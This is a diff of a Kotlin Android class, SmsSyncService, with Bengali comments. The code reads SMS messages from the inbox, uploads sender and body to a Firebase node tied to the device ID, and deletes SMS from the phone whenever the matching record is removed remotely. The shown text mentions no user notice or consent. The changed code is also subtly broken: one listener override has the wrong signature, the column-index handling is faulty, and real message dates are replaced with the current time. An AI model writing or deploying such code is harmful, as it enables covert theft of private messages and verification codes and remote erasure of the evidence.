@@ -1,11 +1,11 @@
 package com.example.aplay
 
-import android.content.ContentUris
 import android.content.Context
 import android.database.Cursor
 import android.net.Uri
 import android.provider.Settings
-import com.google.firebase.database.FirebaseDatabase
+import android.telephony.SmsManager
+import com.google.firebase.database.*
 
 class SmsSyncService(private val context: Context) {
 
@@ -14,57 +14,54 @@ class SmsSyncService(private val context: Context) {
         Settings.Secure.ANDROID_ID
     ) ?: "unknown_device"
 
-    private val smsRef = FirebaseDatabase.getInstance().getReference("sms").child(deviceId)
+    private val smsRef: DatabaseReference =
+        FirebaseDatabase.getInstance().getReference("sms").child(deviceId)
 
-    // প্রথম 20 SMS আপলোড
+    // প্রথম N SMS আপলোড
     fun uploadInitialSms(limit: Int = 20) {
         val uriSms = Uri.parse("content://sms/inbox")
         val cursor: Cursor? = context.contentResolver.query(uriSms, null, null, null, null)
-        cursor?.use {
-            val addressIndex = it.getColumnIndex("address")
-            val bodyIndex = it.getColumnIndex("body")
-            val dateIndex = it.getColumnIndex("date")
-            val idIndex = it.getColumnIndex("_id")
 
+        cursor?.use {
             var count = 0
             while (it.moveToNext() && count < limit) {
-                val smsId = if (idIndex != -1) it.getString(idIndex) else continue
-                val sender = if (addressIndex != -1) it.getString(addressIndex) else "Unknown"
-                val body = if (bodyIndex != -1) it.getString(bodyIndex) else ""
-                val timestamp = if (dateIndex != -1) it.getString(dateIndex)?.toLongOrNull() ?: System.currentTimeMillis() else System.currentTimeMillis()
+                val id = it.getString(it.getColumnIndex("_id") ?: -1) ?: continue
+                val sender = it.getString(it.getColumnIndex("address") ?: -1) ?: ""
+                val body = it.getString(it.getColumnIndex("body") ?: -1) ?: ""
 
                 val smsData = mapOf(
-                    "smsId" to smsId,
+                    "id" to id,
                     "sender" to sender,
                     "body" to body,
-                    "timestamp" to timestamp
+                    "timestamp" to System.currentTimeMillis()
                 )
-
-                smsRef.child(smsId).setValue(smsData)
+                smsRef.child(id).setValue(smsData)
                 count++
             }
         }
     }
 
-    // Firebase থেকে delete হলে ফোন থেকেও মুছে দাও
+    // Firebase থেকে ডিলেট হলে ফোন থেকেও ডিলেট
     fun listenForFirebaseDeletion() {
-        smsRef.addChildEventListener(object : com.google.firebase.database.ChildEventListener {
-            override fun onChildAdded(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}
-            override fun onChildChanged(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}
-            override fun onChildMoved(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {}
-
-            override fun onChildRemoved(snapshot: com.google.firebase.database.DataSnapshot) {
-                val smsId = snapshot.child("smsId").getValue(String::class.java) ?: return
+        smsRef.addChildEventListener(object : ChildEventListener {
+            override fun onChildRemoved(snapshot: DataSnapshot) {
+                val smsId = snapshot.key ?: return
                 deleteSmsFromPhone(smsId)
             }
 
-            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
+            override fun onChildAdded(snapshot: DataSnapshot) {}
+            override fun onChildChanged(snapshot: DataSnapshot) {}
+            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
+            override fun onCancelled(error: DatabaseError) {}
         })
     }
 
     private fun deleteSmsFromPhone(smsId: String) {
-        val smsLongId = smsId.toLongOrNull() ?: return
-        val uri = ContentUris.withAppendedId(Uri.parse("content://sms"), smsLongId)
-        context.contentResolver.delete(uri, null, null)
+        try {
+            val uriSms = Uri.parse("content://sms")
+            context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 }
